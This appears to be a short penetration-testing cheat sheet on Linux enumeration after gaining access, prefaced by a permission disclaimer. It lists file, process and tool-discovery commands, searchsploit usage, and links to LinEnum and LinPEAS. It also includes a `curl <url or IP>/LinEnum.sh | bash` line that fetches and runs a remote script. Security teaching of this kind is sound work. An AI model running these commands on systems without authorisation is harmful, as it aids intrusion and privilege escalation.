# Enumeration

{% hint style="success" %}
Hack Responsibly.

Always ensure you have **explicit** permission to access any computer system **before** using any of the techniques contained in these documents.  You accept full responsibility for your actions by applying any knowledge gained here.  
{% endhint %}

### Enumeration

find files user has access to:

```bash
find / -user <username> -ls 2>/dev/null
```

`which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/null` - Check if each of these useful programs are installed on the machine \(only shows the ones currently installed\). 

[Linux Privilege Checker](https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py)

full linux enumeration:

* [LinEnum.sh](https://github.com/rebootuser/LinEnum) 
* [LinPEAS.sh](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

download **and** execute script \(such as LinEnum.sh\) \[from remote host\]: `curl <url or IP>/LinEnum.sh | bash`

Locate exploits:

```bash
searchsploit <name_of_program> 

#to pull exploit code:
searchsploit -x <name/number of exploit>
```

enumerate running processes: `pspy (TODO: find github and link it)`

`ps -U root -u root ux` View all processes started by a certain user \(`root` in this case\)

enumeration multi-tool: [Sparta](https://sparta.secforce.com/) \(does nmap, hydra, nikto, sqlscan, ssl...\)

Semi-automated enumeration all-in-one \(use this!\): [nmapAutomator](https://github.com/21y4d/nmapAutomator)

Unix hardening tool that can be used for enumeration: [Bastille](http://bastille-linux.sourceforge.net/)

enumerate info about current processes running from: `/proc/self/status`

